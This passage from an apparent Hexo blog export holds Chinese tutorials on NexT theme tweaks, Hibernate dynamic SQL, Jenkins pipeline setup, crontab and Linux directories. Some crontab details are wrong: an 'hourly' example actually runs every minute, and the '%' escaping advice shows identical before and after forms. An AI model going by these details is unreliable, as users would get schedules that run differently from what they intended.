<p>如果想要加入歌单，就需要自己创建歌单，然后分享歌单，找到自己的分享动态，点进去可以看到有“生成外链播放器”这些字眼，其余操作就和上面一样了。不过，你的歌单有变化的话，这个外链的歌曲同样跟着变，这一点挺棒的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">110</span> <span class="attr">src</span>=<span class="string">&quot;//music.163.com/outchain/player?type=0&amp;id=578557134&amp;auto=1&amp;height=90&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="添加打赏功能"><a href="#添加打赏功能" class="headerlink" title="添加打赏功能"></a>添加打赏功能</h2><p><a href="http://www.duwenzhang.com/down/zanshang_jiaocheng.html">生成微信及支付宝付款二维码</a></p>
<p>主题配置文件中添加如下代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打赏</span></span><br><span class="line">wechatpay: http://img.willowspace.cn/hexo_reward_qrcode_img/wechatpay.jpeg</span><br><span class="line">alipay: http://img.willowspace.cn/hexo_reward_qrcode_img/alipay.jpeg</span><br></pre></td></tr></table></figure>

<p>打赏相关的模板为</p>
<p>{next}&#x2F;layout&#x2F;_macro&#x2F;post.swig</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 文章详情中打赏部分 --&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &#x27;reward.swig&#x27; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>{next}&#x2F;layout&#x2F;_macro&#x2F;reward.swig</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 打赏 --&gt;</span></span><br><span class="line">&#123;% if theme.alipay or theme.wechatpay %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关于next主题及hexo相关的问题，欢迎大家给我留言，一起讨论。</p>
</blockquote>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hibernate的动态SQL机制</title>
    <url>/technology/2017/12/hibernate%E7%9A%84%E5%8A%A8%E6%80%81SQL%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h1><p>使用hibernate管理ORM时，如果某个映射实体字段为null保存时会报column ‘xx’ cannot be null之类的异常，导致存库失败，为解决这个问题，hibernate提供了动态SQL的机制。</p>
<h1 id="二、解决方案"><a href="#二、解决方案" class="headerlink" title="二、解决方案"></a>二、解决方案</h1><p>在实体关系配置时，加入<code>dynamic-insert</code> &#x2F; <code>dynamic-update</code> （对应JPA中的<code>@DynamicInsert</code>&#x2F; <code>@DynamicUpdate</code>）会在执行插入或更新时动态判断字段是否为null（或是否有更新），如果为null（或没有更新）则不更新这类字段，也就不会产生异常。它的原理是在实体被加载到session中时会保存一份快照，如果在后续的更新操作检测到有更新，则动态生成更新部分涉及到的字段的sql。</p>
<h1 id="三、Bonus"><a href="#三、Bonus" class="headerlink" title="三、Bonus"></a>三、Bonus</h1><h2 id="使用动态SQL的前提"><a href="#使用动态SQL的前提" class="headerlink" title="使用动态SQL的前提"></a>使用动态SQL的前提</h2><p>就算使用了动态SQL机制，但如果字段在DDL中没有声明默认值，那么当实体字段为null时进行更新，依然会由db层面报出异常。因此要规范DDL，并结合动态SQL机制来避免业务代码出现实体保存时的空值异常。 案例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># java code</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">session.save(user);</span><br><span class="line"></span><br><span class="line"># exception</span><br><span class="line">org.hibernate.PropertyValueException: not-<span class="literal">null</span> property references a <span class="literal">null</span> or <span class="keyword">transient</span> value: User.avatar</span><br><span class="line"></span><br><span class="line"># hibernate mapping</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="title class_">name</span>=<span class="string">&quot;User&quot;</span> table=<span class="string">&quot;user&quot;</span> dynamic-insert=<span class="string">&quot;true&quot;</span> dynamic-update=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">    &lt;property name=<span class="string">&quot;avatarId&quot;</span> column=<span class="string">&quot;avatar_id&quot;</span> type=<span class="string">&quot;integer&quot;</span> not-<span class="literal">null</span>=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">&lt;/class&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># table DDL 没有设置默认值，如果实体值为<span class="literal">null</span>依然会由db报异常</span><br><span class="line">CREATE TABLE `user` (</span><br><span class="line">  `avatar_id` <span class="type">int</span>(<span class="number">11</span>) NOT NULL</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="动态SQL的使用限制：同一个Session"><a href="#动态SQL的使用限制：同一个Session" class="headerlink" title="动态SQL的使用限制：同一个Session"></a>动态SQL的使用限制：同一个Session</h2><p>动态SQL的使用是有前提条件的：需要在同一个Session中操作实体才能生效。 前面提到动态SQL的原理是在实体加载到Session中时保留了一份快照，后续操作时比对快照生成正确的sql操作，那么如果一个实体加载和回写使用的Session是不同的，那么自然无法进行快照比对，那么动态SQL的机制也就无法实施，hibernate只好按照默认规则更新全字段。</p>
<p>看个例子：如果我们在Controller层去写业务逻辑（__生产中请务必不要这么干！__）就极有可能会导致<code>@DynamicUpdate</code>失效，比如下面这段代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/queryAndUpdate&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">queryAndUpdate</span><span class="params">(Http http)</span> &#123;</span><br><span class="line">	<span class="comment">//Controller层写业务逻辑</span></span><br><span class="line">	<span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>; </span><br><span class="line">	<span class="comment">//using session1</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> services.getDaos().getUserDao().findById(id);</span><br><span class="line">	<span class="comment">//using session2 user中加载有没有映射到的关联实体 更新时抛出异常</span></span><br><span class="line">    lecturer = services.getUserService().updateUser(user);</span><br><span class="line">    <span class="keyword">return</span> Result.success().setBean(user);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实体</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@DynamicInsert</span></span><br><span class="line"><span class="meta">@DynamicUpdate</span></span><br><span class="line"><span class="meta">@Table(name = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">	<span class="meta">@Id</span></span><br><span class="line">	<span class="meta">@Column(name = &quot;id&quot;)</span></span><br><span class="line">	<span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">	<span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@NotFound(action = NotFoundAction.IGNORE)</span></span><br><span class="line">	<span class="meta">@OneToOne(targetEntity = File.class,cascade = CascadeType.REFRESH)</span></span><br><span class="line">	<span class="meta">@JoinColumn(name = &quot;avatar_id&quot;)</span></span><br><span class="line">	<span class="keyword">private</span> File avatar;  <span class="comment">//未加载的关联实体</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原因是我们一般会把事务控制在Service层，那么在Controller层的业务逻辑加载完一个对象，当对象返回到Controller层其实就已经穿透了事务边界，事务结束，hibernate默认会关闭Session；那么下面再次进入Service层更新这个对象就会开启新的事务，由新的Session来进行执行。</p>
<p>所以我们要想解决上述问题，目标很明确，在Controller中不会因为穿透了Service层而加载新的Session。</p>
<p>Spring为我们提供了<code>OpenSessionInViewFilter</code>这个过滤器可以轻松的达到上述目的，它将开启一个Session绑定到当前请求线程，这个线程上的Session将会被<code>TransactionManager</code>利用，因此事务结束(Service层穿透)也不会关闭Session，而是在整个请求周期中复用同一个Session。具体参考_<a href="https://docs.spring.io/spring/docs/4.3.0.RC1/javadoc-api//org/springframework/orm/hibernate3/support/OpenSessionInViewFilter.html">Spring文档</a>_，这里不展开。</p>
<p>至此，动态SQL在整个请求周期内可以正常运行。</p>
<h2 id="性能！"><a href="#性能！" class="headerlink" title="性能！"></a>性能！</h2><p>另外值得注意的是动态SQL打开了以后，不同对象的sql语句会不一样，如果一次更新多条记录，hibernate将不能使用 executeBatch进行批量更新，这样效率将大打折扣。在这种情况下，多条sql意味着数据库要编译多次sql语句。 </p>
<p>因此有批量更新的特殊场景时，建议单独使用hql或者sql进行操作。</p>
<h2 id="文档参考："><a href="#文档参考：" class="headerlink" title="文档参考："></a>文档参考：</h2><p><em><a href="http://docs.jboss.org/hibernate/orm/5.2/userguide/html_single/Hibernate_User_Guide.html#annotations-hibernate-dynamicupdate">annotations-hibernate-dynamicupdate</a></em></p>
<p><em><a href="http://docs.jboss.org/hibernate/orm/5.2/userguide/html_single/Hibernate_User_Guide.html#pc-managed-state-dynamic-update">pc-managed-state-dynamic-update</a></em></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>hibernate</tag>
        <tag>JPA</tag>
        <tag>transaction</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>jenkins ci 环境搭建</title>
    <url>/technology/2017/08/jenkins-ci-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<blockquote>
<p>简介</p>
</blockquote>
<p>jenkins是一个持续集成(CI)工具，使用java编写</p>
<p><code>CI</code> <strong>continuous integration</strong> 持续集成</p>
<p><code>SCM</code> <strong>source code management</strong> 源码管理</p>
<h1 id="下载jenkins"><a href="#下载jenkins" class="headerlink" title="下载jenkins"></a>下载jenkins</h1><p>有多种安装方式，我们选择war包部署，war包下载地址 <a href="https://jenkins.io/download/">https://jenkins.io/download/</a></p>
<p>下载的war包为<code>jenkins.war</code></p>
<h1 id="部署至tomcat"><a href="#部署至tomcat" class="headerlink" title="部署至tomcat"></a>部署至tomcat</h1><p>这里采用一台单独的tomcat部署jenkins</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因为此tomcat只用来部署jenkins，所以先删除webapps下其他应用</span></span><br><span class="line">rm -rf $&#123;tomcat_path&#125;/webapps/*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署jenkins的war包</span></span><br><span class="line">mv $&#123;download_path&#125;/jenkins.war $&#123;tomcat_path&#125;/webapps/ROOT.war</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定jenkins工作目录(如有必要)，默认为~/.jenkins</span></span><br><span class="line">vim $&#123;download_path&#125;/bin/catalina.sh</span><br><span class="line">CATALINA_OPTS=&quot;-DJENKINS_HOME=~/jenkins-cluster-1/&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或</span></span><br><span class="line">vim $&#123;download_path&#125;/conf/context.xml</span><br><span class="line">&lt;Context ...&gt;</span><br><span class="line">  &lt;Environment name=&quot;JENKINS_HOME&quot; value=&quot;~/jenkins-cluster-1/&quot; type=&quot;java.lang.String&quot;/&gt;</span><br><span class="line">&lt;/Context&gt;</span><br></pre></td></tr></table></figure>

<h1 id="配置jenkins"><a href="#配置jenkins" class="headerlink" title="配置jenkins"></a>配置jenkins</h1><p>tomcat部署启动完jenkins后，访问对应端口可以看到如下jenkins的初始界面</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1487009258517.png"></p>
<p>查看<code>/root/.jenkins/secrets/initialAdminPassword</code>文件可以获得管理员密码，输入后可以解锁Jenkins，开始使用。</p>
<h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>初始化界面会提示我们安装插件，我们选择推荐插件</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1487009586270.png"></p>
<p>推荐的插件如下图所示</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1504010997582.png"></p>
<p>我们主要需要<code>身份认证</code> <code>源码管理</code> <code>打包构建</code> <code>管道命令</code> 几个方面的插件</p>
<h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><p><code>ssh plugin</code> <code>SSH Slaves plugin</code> <code>Credentials Binding Plugin</code> </p>
<h3 id="源码管理"><a href="#源码管理" class="headerlink" title="源码管理"></a>源码管理</h3><p><code>git plugin</code> <code>github plugin</code> <code>GitHub Branch Source Plugin</code> <code>gitlab plugin</code> <code>subversion Plug-in</code> </p>
<h3 id="打包构建"><a href="#打包构建" class="headerlink" title="打包构建"></a>打包构建</h3><p><code>Gradle Plugin</code></p>
<h3 id="管道命令"><a href="#管道命令" class="headerlink" title="管道命令"></a>管道命令</h3><p><code>Pipeline</code>   <code>Pipeline:State View Plugin</code></p>
<p><a href="https://my.oschina.net/ghm7753/blog/371954?p=1">pipeline构建参考</a></p>
<h3 id="其它插件"><a href="#其它插件" class="headerlink" title="其它插件"></a>其它插件</h3><p><code>Role-based Authorization Strategy</code>基于角色的的用户权限控制</p>
<h2 id="设置全局工具"><a href="#设置全局工具" class="headerlink" title="设置全局工具"></a>设置全局工具</h2><p>系统设置-&gt;Global Tool Configuration-&gt;JDK、Git、Maven</p>
<p>系统设置-&gt;Shell-&gt;Shell executable-&gt;<code>/bin/zsh</code></p>
<h2 id="Jenkins内部shell-UTF-8-编码设置"><a href="#Jenkins内部shell-UTF-8-编码设置" class="headerlink" title="Jenkins内部shell UTF-8 编码设置"></a>Jenkins内部shell UTF-8 编码设置</h2><p><img src="http://img.willowspace.cn/willowspace_2016/1487125834004.png"></p>
<h2 id="参数化构建"><a href="#参数化构建" class="headerlink" title="参数化构建"></a>参数化构建</h2><p><img src="http://img.willowspace.cn/willowspace_2016/1487126266497.png"></p>
<h3 id="Pipeline构建"><a href="#Pipeline构建" class="headerlink" title="Pipeline构建"></a>Pipeline构建</h3><p>创建一个新任务，任务类型选择pipeline</p>
<h4 id="拉取源码"><a href="#拉取源码" class="headerlink" title="拉取源码"></a>拉取源码</h4><p>勾选<code>GitHub hook trigger for GITScm polling</code> 参考<a href="https://www.fourkitchens.com/blog/article/trigger-jenkins-builds-pushing-github">Trigger Jenkins builds by pushing to Github</a></p>
<ol>
<li>在jenkins所在服务器上生成ssh key</li>
<li>在gitlab的Deploy Key中添加public key</li>
<li>在jenkins创建项目，添加gitlab的项目地址，选择添加Credential，填入private key</li>
</ol>
<h4 id="编写构建打包部署的pipeline脚本"><a href="#编写构建打包部署的pipeline脚本" class="headerlink" title="编写构建打包部署的pipeline脚本"></a>编写构建打包部署的pipeline脚本</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">node &#123;</span><br><span class="line">    stage(<span class="string">&#x27;checkout&#x27;</span>) &#123;</span><br><span class="line">        checkout([<span class="attr">$class:</span> <span class="string">&#x27;GitSCM&#x27;</span>, <span class="attr">branches:</span> [[<span class="attr">name:</span> <span class="string">&#x27;*/master&#x27;</span>]], <span class="attr">doGenerateSubmoduleConfigurations:</span> <span class="literal">false</span>, <span class="attr">extensions:</span> [], <span class="attr">submoduleCfg:</span> [], <span class="attr">userRemoteConfigs:</span> [[<span class="attr">credentialsId:</span> <span class="string">&#x27;&#123;git_credentialsId&#125;&#x27;</span>, <span class="attr">url:</span> <span class="string">&#x27;&#123;git_url&#125;&#x27;</span>]]])</span><br><span class="line">    &#125;</span><br><span class="line">    stage(<span class="string">&#x27;build&#x27;</span>) &#123;</span><br><span class="line">        sh <span class="string">&#x27;mvn clean package&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    stage(<span class="string">&#x27;send war to server&#x27;</span>) &#123;</span><br><span class="line">      sh <span class="string">&#x27;scp &#123;user_root_path&#125;/.jenkins/workspace/&#123;you_project_name&#125;/target/&#123;you_project_packaged_name&#125;.war &#123;user&#125;@&#123;server_ip&#125;:&#123;tomcat_path&#125;/webapps/javavirtual.war&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    stage(<span class="string">&#x27;restart tomcat server&#x27;</span>)&#123;</span><br><span class="line">        sh <span class="string">&#x27;echo &quot;wait restart shell&quot;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="基于角色的任务访问控制"><a href="#基于角色的任务访问控制" class="headerlink" title="基于角色的任务访问控制"></a>基于角色的任务访问控制</h2><ol>
<li>系统管理-&gt;管理插件-&gt;安装<a href="https://plugins.jenkins.io/role-strategy">Role-based Authorization Strategy</a>插件</li>
<li>系统管理-&gt;<code>Configure Global Security</code>-&gt;访问控制-&gt;授权策略-&gt;Role-Based Strategy-&gt;保存</li>
<li>系统管理-&gt;Manage and Assign Roles-&gt;Manage Roles-&gt;Global roles-&gt;在admin角色外创建其他角色分配Overall&#x2F;Read权限</li>
<li><strong>指定角色访问特定项目</strong></li>
</ol>
<p>系统管理-&gt;Manage and Assign Roles-&gt;Manage Roles-&gt;Project roles-&gt;添加一个角色,然后指定项目Pattern(注意：patter不是正则表达式,其中<code>*</code>要用<code>.*</code>代替)</p>
<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><h3 id="pipeline使用nohup命令启动后台进程无效"><a href="#pipeline使用nohup命令启动后台进程无效" class="headerlink" title="pipeline使用nohup命令启动后台进程无效"></a>pipeline使用nohup命令启动后台进程无效</h3><p><a href="https://wiki.jenkins.io/display/JENKINS/ProcessTreeKiller">参考ProcessTreeKiller</a></p>
<h3 id="使用Boolean类型参数化构建时，参数逻辑判断总是true"><a href="#使用Boolean类型参数化构建时，参数逻辑判断总是true" class="headerlink" title="使用Boolean类型参数化构建时，参数逻辑判断总是true"></a>使用Boolean类型参数化构建时，参数逻辑判断总是true</h3><p>jenkins传入groovy的boolean parameter是对象类型，非null总是true，所以判断总为true，进行一次类型转换就好</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> booleanParameter = Boolean.valueOf(jenkinsBooleanParameter);</span><br></pre></td></tr></table></figure>

<h3 id="容器的编码问题"><a href="#容器的编码问题" class="headerlink" title="容器的编码问题"></a>容器的编码问题</h3><blockquote>
<p>Your container doesn’t use UTF-8 to decode URLs. If you use non-ASCII characters as a job name etc, this will cause problems. See <a href="http://wiki.jenkins-ci.org/display/JENKINS/Containers">Containers</a> and <a href="http://wiki.jenkins-ci.org/display/JENKINS/Tomcat#Tomcat-i18n">Tomcat i18n</a> for more details.</p>
</blockquote>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>持续集成</tag>
        <tag>CI</tag>
        <tag>jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>linux定时任务crontab</title>
    <url>/technology/2017/12/linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1crontab/</url>
    <content><![CDATA[<h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常适合周期性的日志分析或数据备份等工作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab [-u user] file crontab [-u user][ -e | -l | -r ]</span><br></pre></td></tr></table></figure>

<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul>
<li>-u user：用来设定某个用户的crontab服务；</li>
<li>file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。</li>
<li>-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。</li>
<li>-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。</li>
<li>-r：从&#x2F;var&#x2F;spool&#x2F;cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。</li>
<li>-i：在删除用户的crontab文件时给确认提示。</li>
</ul>
<h2 id="crontab的文件格式"><a href="#crontab的文件格式" class="headerlink" title="crontab的文件格式"></a>crontab的文件格式</h2><p>分 时 日 月 星期 要运行的命令</p>
<ul>
<li>第1列分钟0～59</li>
<li>第2列小时0～23（0表示子夜）</li>
<li>第3列日1～31</li>
<li>第4列月1～12</li>
<li>第5列星期0～7（0和7表示星期天）</li>
<li>第6列要运行的命令</li>
</ul>
<h2 id="crontab文件惯例"><a href="#crontab文件惯例" class="headerlink" title="crontab文件惯例"></a>crontab文件惯例</h2><p>我个人惯例会把cron文件创建在<code>/opt/cron</code>目录下</p>
<p>新创建的cron文件的副本会被放在<code>/var/spool/cron/crontabs</code>目录下，文件名为用户名</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建cron文件</span></span><br><span class="line">vim /opt/cron/cron_file</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提交cron任务</span></span><br><span class="line">crontab /opt/cron/cron_file</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">/etc/init.d/cron start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭</span></span><br><span class="line">/etc/init.d/cron stop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">/etc/init.d/cron restart</span><br></pre></td></tr></table></figure>

<h2 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h2><p>新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。</p>
<p>当crontab失效时，可以尝试&#x2F;etc&#x2F;init.d&#x2F;crond restart解决问题。或者查看日志看某个job有没有执行&#x2F;报错tail -f &#x2F;var&#x2F;log&#x2F;cron。</p>
<p>千万别乱运行crontab -r。它从Crontab目录（&#x2F;var&#x2F;spool&#x2F;cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。</p>
<p>在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+%Y%m%d’。&#96;</p>
<h2 id="cron表达式"><a href="#cron表达式" class="headerlink" title="cron表达式"></a>cron表达式<img src="http://img.willowspace.cn/willowspace_2016/1504599291802.png"></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例1：每1分钟执行一次myCommand</span></span><br><span class="line">* * * * * myCommand</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例2：每小时的第3和第15分钟执行</span></span><br><span class="line">3,15 * * * * myCommand</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例3：在上午8点到11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 * * * myCommand</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例4：每隔两天的上午8点到11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 */2  *  * myCommand</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例5：每周一上午8点到11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 * * 1 myCommand</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例6：每晚的21:30重启smb</span></span><br><span class="line">30 21 * * * /etc/init.d/smb restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例7：每月1、10、22日的4 : 45重启smb</span></span><br><span class="line">45 4 1,10,22 * * /etc/init.d/smb restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例8：每周六、周日的1 : 10重启smb</span></span><br><span class="line">10 1 * * 6,0 /etc/init.d/smb restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb</span></span><br><span class="line">0,30 18-23 * * * /etc/init.d/smb restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例10：每星期六的晚上11 : 00 pm重启smb</span></span><br><span class="line">0 23 * * 6 /etc/init.d/smb restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例11：每一小时重启smb</span></span><br><span class="line">* */1 * * * /etc/init.d/smb restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例12：晚上11点到早上7点之间，每隔一小时重启smb</span></span><br><span class="line">0 23-7 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h1 id="定时备份"><a href="#定时备份" class="headerlink" title="定时备份"></a>定时备份</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建定时任务文件</span></span><br><span class="line">crontab $cron-file-name</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入规则每天0点、12点备份一次</span></span><br><span class="line">vim $cron-file-name</span><br><span class="line">0 0,12 */1 * * $backup-shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动定时任务</span></span><br><span class="line">crontab $cron-file-name</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>linux</tag>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>linux目录结构及惯例用法</title>
    <url>/technology/2017/05/linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%8F%8A%E6%83%AF%E4%BE%8B%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li><p><code>/</code> 文件系统的入口，最高一级目录；</p>
</li>
<li><p><code>/usr</code> 系统存放程序的目录，比如命令、帮助文件等。这个目录下有很多的文件和目录。当我们安装一个__Linux发行版官方提供的软件包__时，大多安装在这里。如果有涉及服务器配置文件的，会把配置文件安装在&#x2F;etc目录中。</p>
</li>
<li><p><code>/var</code> 这个目录的内容是经常变动的，看名字就知道，我们可以理解为vary的缩写，__&#x2F;var&#x2F;log 这是用来存放系统日志的目录__；__&#x2F;var&#x2F;www目录是定义Apache服务器站点存放目录__；__&#x2F;var&#x2F;lib 用来存放一些库文件__，比如MySQL，以及MySQL数据库的的存放地；&#x2F;var&#x2F;spool 打印机、邮件、代理服务器等假脱机目录；</p>
</li>
<li><p><code>/srv</code> 主要用来存储本机或本服务器提供的服务或数据。（用户主动生产、对外提供服务）__服务器被用作Web开发时，静态资源文件更应该被放在&#x2F;srv&#x2F;www下，而不是&#x2F;var&#x2F;www下__（因为&#x2F;srv目录是新标准中才出现的，而且Apache将其设为了web默认目录，所以现在绝大多数人都把web文件放在这里）。如ftp、流媒体服务等也应该被放在&#x2F;srv对应的目录下。如果对应目录太大，应该另外挂载分区。</p>
</li>
<li><p><code>/opt</code> Optional application software packages ，也就是__自定义软件包__，有些我们自己编译的软件包，就可以安装在这个目录中；通过源码包安装的软件，可以通过 .&#x2F;configure –prefix&#x3D;&#x2F;opt&#x2F;，将软件安装到opt目录。这个目录包含所有默认系统安装之外的软件和添加的包。</p>
</li>
<li><p>&#x2F;etc&#96; Editable Text Configuration 存放__系统__程序或者一般工具的配置文件。__如安装了apache2之后，配置文件在&#x2F;etc&#x2F;apache2&#x2F;目录下__。&#x2F;etc&#x2F;init.d 这个目录是用来存放系统或服务器以System V模式启动的脚本，这在以System V模式启动或初始化的系统中常见。如apache2的&#x2F;etc&#x2F;init.d apache2 start|stop|restart MySQL为&#x2F;etc&#x2F;init.d mysql start|stop|restart </p>
</li>
<li><p><code>/mnt</code> 一般是用于存放挂载储存设备的挂载目录的，比如有cdrom 等目录。有时我们可以把让系统开机自动挂载文件系统，把挂载点放在这里也是可以的。比如光驱可以挂载到&#x2F;mnt&#x2F;cdrom 。这是一个普通的加载目录，在这里你可以加载你的文件系统或设备。加载是使一个文件系统对于系统可用的过程。在加载后你的文件可以在加载目录下访问。这个目录通常包含加载目录或用于加载软驱和光驱的子目录。如果需要，你也可以在这里建立其它的加载目录。对于加载目录的位置并没有强制性的要求，你可以在系统的任意位置建立加载目录。建立 &#x2F;mnt 只是为了使系统更工整的惯例。 </p>
</li>
<li><p><code>/tmp</code> 临时文件目录，有时__用户__运行程序的时候，会产生临时文件。 &#x2F;tmp就用来存放临时文件的。&#x2F;var&#x2F;tmp目录和这个目录相似。许多程序在这里建立lock文件和存储临时数据。有些系统会在启动或关机时清空此目录。</p>
</li>
<li><p><code>/boot</code> 包含Linux内核及系统引导程序所需要的文件，比如 vmlinuz initrd.img 文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器也位于这个目录；</p>
</li>
<li><p><code>/root</code> Linux超级权限用户root的家目录；</p>
</li>
